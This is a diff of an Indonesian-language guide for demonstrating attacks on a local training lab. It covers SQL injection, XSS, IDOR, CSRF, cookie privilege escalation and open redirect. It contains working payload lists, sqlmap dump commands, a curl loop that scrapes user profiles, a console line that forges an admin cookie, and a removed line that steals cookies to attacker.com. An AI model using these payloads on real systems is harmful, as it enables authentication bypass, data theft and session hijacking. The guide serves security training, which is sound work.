@@ -9,168 +9,105 @@ Dokumen ini berisi panduan teknis untuk demonstrasi live-exploitation. Fokus pad
 **Target:** `/labs/sqli-login`  
 **Goal:** Login sebagai Admin tanpa password.
 
-### 🛠️ Manual Way
-1. Buka halaman login.
-2. Masukkan username: `admin`
-3. Masukkan password: `' OR '1'='1`
-4. Klik **Execute Exploit**.
+### 🛠️ Manual Way (Standard)
+1. Username: `admin`
+2. Password: `' OR '1'='1`
+
+### 🚀 Nyeleneh Payloads (GitHub Style)
+Bapak bisa pamer pakai payload yang lebih "keren" ini:
+- `admin' #`
+- `admin' --`
+- `admin' /*`
+- `' OR TRUE --`
+- `' OR 1=1 LIMIT 1 --`
 
 ### 🤖 Automated (cURL)
 ```bash
 curl -X POST http://localhost:3000/api/auth/login \
      -H "Content-Type: application/json" \
-     -d '{"username":"admin", "password":"'\'' OR '\''1'\''='\''1"}'
+     -d '{"username":"admin", "password":"admin'\'' #"}'
 ```
 
-### 🔍 Vulnerable Code (`api/auth.js`)
-```javascript
-const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
-// MASALAH: Variabel password langsung disisipkan ke string query tanpa sanitasi.
-```
-
-### ⚠️ Impact
-Attacker dapat masuk ke akun siapapun (termasuk admin) tanpa tahu kredensialnya. Ini adalah level kritikalitas tertinggi (A01:2021-Broken Access Control).
+### 🔍 Root Cause & Impact
+**Code:** `SELECT * FROM users WHERE username='${username}' AND password='${password}'`  
+**Impact:** Bypass otentikasi total. Celah ini memungkinkan penyerang masuk tanpa password dengan memanipulasi logika logika Boolean SQL.
 
 ---
 
 ## 2. SQL Injection: UNION Extraction
 **Target:** `/labs/sqli-union`  
-**Goal:** Mencuri data dari tabel lain (leaking flags).
 
-### 🛠️ Manual Way
-1. Cari tahu jumlah kolom: `' UNION SELECT 1,2,3,4,5,6,7,8 --`
-2. Tarik flag dari tabel challenges:
-   `' UNION SELECT 1,flag,3,4,5,6,7,8 FROM challenges --`
+### 🚀 Nyeleneh Payloads (Advanced)
+Kalau `' UNION SELECT ...` sudah biasa, coba tunjukkan cara menebak versi database:
+- `' UNION SELECT 1,sqlite_version(),3,4,5,6,7,8 --`
+- `' UNION SELECT 1,group_concat(name),3,4,5,6,7,8 FROM sqlite_master --` (Dumping daftar tabel)
 
-### 🤖 Automated (SQLmap)
+### 🤖 Automated (SQLmap Pro)
 ```bash
-sqlmap -u "http://localhost:3000/api/search?q=test" --batch --dump -T challenges -C flag
+# Dumping flag secara spesifik
+sqlmap -u "http://localhost:3000/api/search?q=test" --technique=U --dbms=sqlite --dump -C flag
 ```
-
-### 🔍 Vulnerable Code (`api/search.js`)
-```javascript
-const query = `SELECT id, title, description, category, difficulty, hint, points, endpoint 
-               FROM challenges WHERE title LIKE '%${q}%'`;
-// MASALAH: Penggunaan LIKE dengan input user yang tidak di-escape memungkinkan penambahan perintah SQL (UNION).
-```
-
-### ⚠️ Impact
-Pencurian database secara massal (PII Leakage). Data sensitif seperti password hash, email, dan token bisa dikuras.
 
 ---
 
-## 3. Reflected XSS (Client-Side)
-**Target:** `/labs/xss-reflected`  
-**Goal:** Menjalankan script di browser korban.
+## 3. XSS Reflected & Stored
+**Target:** `/labs/xss-reflected` & `/labs/xss-stored`
 
-### 🛠️ Manual Way
-Masukkan payload ke input: `<script>alert(window.origin)</script>` atau `<img src=x onerror=alert(1)>`
+### 🛠️ Manual Way (Standard)
+`<script>alert(1)</script>`
 
-### 🤖 Automated (URL-based)
+### 🚀 Nyeleneh Payloads (GitHub "Obscure" Style)
+Tunjukkan kalau XSS tidak harus pakai kata `alert` atau tag `script`:
+- **SVG Power:** `<svg/onload=prompt(window.origin)>`
+- **Image Error:** `<img src=x onerror=confirm(document.domain)>`
+- **Details Toggle:** `<details/open/ontoggle=prompt(1)>`
+- **Autofocus Hack:** `<input/autofocus/onfocus=alert(1)>`
+- **Iframe Srcdoc:** `<iframe/srcdoc="<img src=x onerror=alert(1)>"></iframe>`
+
+### 🔍 Root Cause
+Sistem menggunakan `.innerHTML` (Frontend) dan Query SQL mentah (Backend) tanpa sanitasi `DOMPurify` atau `htmlspecialchars`.
+
+---
+
+## 4. Insecure Direct Object Reference (IDOR)
+**Target:** `/labs/idor`
+
+### 🚀 Nyeleneh Technique
+Bukan cuma ganti ID, tapi tunjukkan cara "Mass Exfiltration" pakai satu baris perintah Linux:
 ```bash
-# Kirim link ini ke korban
-http://localhost:3000/labs/xss-reflected?q=<script>alert('XSS')</script>
+# Ambil bio dari 20 user pertama secara otomatis
+for i in {1..20}; do curl -s "http://localhost:3000/api/profile?id=$i" | grep -oP '"bio":"\K[^"]+'; done
 ```
-
-### 🔍 Vulnerable Code (`xss-reflected.html`)
-```javascript
-target.innerHTML = q; 
-// MASALAH: Menggunakan .innerHTML untuk merender input user tanpa filter/encoding.
-```
-
-### ⚠️ Impact
-Pencurian Session Cookie (Session Hijacking), defacement halaman, atau redirect user ke situs phishing.
 
 ---
 
-## 4. Stored XSS (Persistent)
-**Target:** `/labs/xss-stored`  
-**Goal:** Script tertanam di database dan menyerang setiap pengunjung.
+## 5. Cross-Site Request Forgery (CSRF)
+**Target:** `/labs/csrf`
 
-### 🛠️ Manual Way
-Posting pesan baru di Guestbook:
-```html
-<script>fetch('https://attacker.com/steal?c=' + document.cookie)</script>
-```
-
-### 🔍 Vulnerable Code (`api/guestbook.js`)
-```javascript
-const query = `INSERT INTO guestbook_entries (author, message) VALUES ('${author}', '${message}')`;
-// MASALAH: Data disimpan apa adanya ke DB, dan dirender mentah-mentah oleh frontend.
-```
-
-### ⚠️ Impact
-Infeksi massal. Setiap user yang membuka halaman Guestbook akan menjalankan script attacker secara otomatis. Sangat berbahaya untuk worm/malware distribution.
+### 🚀 Nyeleneh Bypass
+Jelaskan kenapa sistem `referer.includes()` itu sampah. 
+Payload domain penyerang: `http://act-lab-csrf-sqli.vercel.app.attacker.com`
+Karena mengandung string yang dicari, sistem akan menganggapnya "Official".
 
 ---
 
-## 5. Insecure Direct Object Reference (IDOR)
-**Target:** `/labs/idor`  
-**Goal:** Mengintip data user lain dengan manipulasi ID.
+## 6. Privilege Escalation (Cookie)
+**Target:** `/admin`
 
-### 🛠️ Manual Way
-1. Lihat URL: `/labs/idor?id=999`
-2. Ubah angka di URL menjadi `1`: `/labs/idor?id=1`
-3. Data Admin akan muncul (termasuk Flag di bio).
-
-### 🤖 Automated (Bash Script)
-```bash
-for i in {1..10}; do curl -s "http://localhost:3000/api/profile?id=$i" | grep "bio"; done
-```
-
-### 🔍 Vulnerable Code (`api/profile.js`)
+### 🚀 Manual Hack (Console Way)
+Alih-alih lewat menu Inspect, ketik ini di Console (F12) biar kelihatan pro:
 ```javascript
-const query = `SELECT * FROM users WHERE id=${id}`;
-// MASALAH: Server percaya pada ID yang dikirim client tanpa mengecek apakah user tsb berhak melihat data tsb.
+document.cookie = "role=admin; path=/"; location.reload();
 ```
-
-### ⚠️ Impact
-Kebocoran data privasi. User biasa bisa melihat invoice, rekam medis, atau chat milik user lain.
+Sekejap Navbar akan berubah dan akses Admin terbuka.
 
 ---
 
-## 6. Cross-Site Request Forgery (CSRF)
-**Target:** `/labs/csrf`  
-**Goal:** Mengubah email korban melalui situs pihak ketiga.
+## 7. Open Redirect
+**Target:** `/labs/redirect`
 
-### 🛠️ Manual Way
-Gunakan `Referer` bypass dengan domain yang mengandung kata kunci (Loose check).
-1. Deploy file HTML nakal di domain `act-lab-csrf.evil.com`.
-2. Klik link dari domain jahat tersebut.
-
-### 🤖 Automated (cURL Bypass)
-```bash
-curl -X POST "http://localhost:3000/api/profile" \
-     -H "Content-Type: application/json" \
-     -H "Referer: http://act-lab-csrf.attacker.com" \
-     -d '{"email":"hacker@actlab.pro"}'
-```
-
-### 🔍 Vulnerable Code (`api/profile.js`)
-```javascript
-const isAuthorized = referer.includes('act-lab-csrf-sqli.vercel.app');
-// MASALAH: Menggunakan .includes() alih-alih pengecekan domain secara ketat.
-```
-
-### ⚠️ Impact
-Akun Takeover. Attacker bisa mengubah email/password korban hanya dengan memancing korban mengklik sebuah link.
-
----
-
-## 7. Privilege Escalation (Cookie Hacking)
-**Target:** `/admin`  
-**Goal:** Menjadi Admin secara instant.
-
-### 🛠️ Manual Way
-1. Buka F12 (Inspect Element) &rarr; Application &rarr; Cookies.
-2. Tambahkan Cookie baru: `role=admin`
-3. Refresh halaman. Navbar akan berubah jadi Pink &rarr; Klik **ADMIN PANEL**.
-
-### 🔍 Vulnerable Code (`middleware/auth.js` & `admin.html`)
-```javascript
-const isAdmin = req.cookies.role === 'admin';
-// MASALAH: Keamanan hanya bergantung pada Client-Side Cookie yang bisa diubah kapan saja oleh user.
-```
-
-### ⚠️ Impact
-Bypass total seluruh sistem keamanan. User bisa menghapus database, mengubah skor, atau mematikan server.
+### 🚀 Nyeleneh Payload
+Coba pakai skema `//` untuk bypass deteksi `http`:
+- `/api/redirect?url=//google.com`
+- `/api/redirect?url=/\evil.com`
+- `/api/redirect?url=https:google.com` (Beberapa browser akan menganggap ini valid)
